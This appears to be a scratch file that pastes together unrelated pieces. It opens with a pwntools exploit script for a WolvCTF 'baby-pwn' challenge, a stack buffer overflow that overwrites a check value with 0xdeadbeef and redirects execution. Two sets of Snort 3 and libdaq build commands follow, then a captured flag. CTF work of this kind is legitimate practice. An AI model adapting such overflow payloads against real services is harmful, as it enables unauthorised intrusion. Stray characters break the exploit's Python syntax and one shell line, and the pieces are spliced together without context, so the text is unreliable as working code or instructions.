# -- coding: utf-8 --
from pwn import *
import time
from ctypes import CDLL
context.log_level = 'debug'
# ENV
PORT =   1337
HOST = "baby-pwn.wolvctf.io"

e = context.binary = ELF('./baby-pwn')
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    r = remote(HOST, PORT)

else:
    r = e.process()
payload= b"a"*(32-4)+p32(0xdeadbeef)+b"a"*8+p16(0x1165)
# r.sendlineafter("Gimme some input: \n",payload)
r.send(payload)3
r.interactive()



1git clone https://github.com/snort3/libdaq.git
$ cd libdaq
$ ./bootstrap
$ ./configure --prefix=/usr/local/lib/daq_s3
$ make install
$ cat /etc/ld.so.conf.d/libdaq3.conf
$ sudo ldconfig
$ git clone https://github.com/snort3/snort3.git
$ export my_path=/path/to/snorty
$ mkdir -p $my_path
$ cd snort3
$ ./configure_cmake.sh --prefix=$my_path 
$ ./configure_cmake.sh --prefix=$my_path \
                       --with-daq-includes=/usr/local/lib/daq_s3/include/ \
                       --with-daq-libraries=/usr/local/lib/daq_s3/lib/
$ ./configure_cmake.sh --help
$ cd build
$ make -j $(nproc)
$ make install
$ $my_path/bin/snort -V
$ $my_path/bin/snort --daq-list
$ $my_path/bin/snort --daq-dir /usr/local/lib/daq_s3/lib/daq --daq-list







sudo apt-get update && apt-get upgrade
sudo apt install build-essential libpcap-dev libpcre3-dev libnet1-dev zlib1g-dev luajit hwloc libdnet-dev libdumbnet-dev bison flex liblzma-dev openssl libssl-dev pkg-config libhwloc-dev cmake cpputest libsqlite3-dev uuid-dev libcmocka-dev libnetfilter-queue-dev libmnl-dev autotools-dev libluajit-5.1-dev libunwind-dev -y
mkdir snort-source-files
git clone https://github.com/snort3/libdaq.git
cd libdaq
./bootstrap
./configure
make
make install
cd ../
wget https://github.com/gperftools/gperftools/releases/download/gperftools-2.9.1/gperftools-2.9.1.tar.gz
tar xzf gperftools-2.9.1.tar.gz
cd gperftools-2.9.1
./configure
make 
make install
cd ../
git clone https://github.com/snortadmin/snort3.git

cd snort3/
./configure_cmake.sh --prefix=/usr/local --enable-tcmalloc
cd build/
make
make install
sudo ldconfig
ln -s /usr/local/bin/snort /usr/sbin/snort
snort -V


flag{i_stay_out_too_late_got_nothing_in_my_brain}
